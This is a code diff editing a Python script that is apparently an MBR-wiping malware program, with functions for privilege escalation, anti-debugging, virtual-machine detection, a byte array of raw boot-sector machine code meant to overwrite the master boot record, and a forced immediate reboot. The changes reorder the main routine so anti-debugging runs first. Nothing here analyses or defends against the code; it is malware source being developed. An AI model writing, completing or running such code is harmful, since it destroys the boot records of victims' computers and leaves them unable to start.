@@ -83,7 +83,7 @@ def CommitSuicide():
 
 """ Stages """
 
-Data = bytes([          0xE9, 0x00, 0x00, 0xE8, 0x21, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x36,
+Data = bytes([              0xE9, 0x00, 0x00, 0xE8, 0x21, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x36,
                             0x7C, 0xE8, 0x00, 0x00, 0x50, 0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x07,
                             0xE8, 0x07, 0x00, 0x46, 0xE9, 0xF3, 0xFF, 0xE9, 0xFD, 0xFF, 0xB4, 0x0E,
                             0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x4F, 0xB9, 0x00, 0x00,
@@ -154,7 +154,7 @@ def SetFiles():
 
 
 def SysDown():
-     # win32api.InitiateSystemShutdown()  
+     # InitiateSystemShutdown()  
      os.system("shutdown -t 0 -r -f ") 
 
 def main():
@@ -163,16 +163,16 @@ def main():
             application_path = sys.executable
         else:
             application_path = os.path.dirname(os.path.abspath(__file__))
+            AntiDebug()
+            if not IsPyExist():
+                    return InstallPy()
             if not IsAdmin():
                 return RunAsAdmin()
-                if not IsPyExist():
-                    return InstallPy()
                     if not IsOnline():
                         return CommitSuicide()
             if not AntiVm():
                 pass
             SetFiles()
-            AntiDebug():
             OverWriteMBR()
 if __name__ == "__main__":
     main()
